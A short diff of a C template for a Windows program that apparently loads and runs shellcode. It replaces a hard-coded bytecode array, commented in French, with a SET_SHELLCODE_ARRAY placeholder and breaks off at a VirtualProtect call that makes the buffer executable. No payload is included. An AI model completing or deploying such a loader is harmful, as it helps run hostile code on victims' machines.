@@ -2,8 +2,7 @@
 
 int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
 {
-    int bytecode_size = SET_SIZE; //récupération de la taille du bytecode
-    unsigned char bytecode[SET_SIZE] = {SET_BYTECODE}; // récupération du bytecode
+    SET_SHELLCODE_ARRAY
     DWORD dummy;
 
     VirtualProtect(bytecode, bytecode_size,
